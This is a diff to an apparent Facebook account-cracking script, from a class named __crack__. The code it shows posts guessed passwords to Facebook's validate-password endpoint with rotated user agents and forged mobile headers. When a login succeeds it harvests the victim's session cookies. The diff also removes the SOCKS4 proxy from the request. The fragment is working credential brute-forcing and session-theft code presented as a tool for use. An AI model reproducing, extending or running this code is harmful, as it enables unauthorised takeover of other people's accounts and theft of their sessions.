@@ -791,7 +791,6 @@ class __crack__:
                 pw = pw.lower()
                 session=requests.Session()
                 nip=random.choice(prox)
-                proxs= {'http': 'socks4://'+nip}
                 #ua1 = random.choice(agen1)
                 #ua2 = random.choice(agen2)
                 ua = random.choice(ugen)
@@ -802,7 +801,7 @@ class __crack__:
                 koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                 koki+=' m_pixel_ratio=2.625; wd=412x756'
                 heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fwww.facebook.com%2Fv3.0%2Fdialog%2Foauth%3Fclient_id%3D1247593455251878%26redirect_uri%3Dhttps%253A%252F%252Fwww.unipin.com%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DHhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D850fbda2-7c15-44d1-a322-ce13588bf858%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.unipin.com%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHhAqTA6Kt2PhUnFjq8sBiRwVuGjS2sk6WiTvltEA%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
                 if "c_user" in session.cookies.get_dict():
                     cooz = session.cookies.get_dict()
                     coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
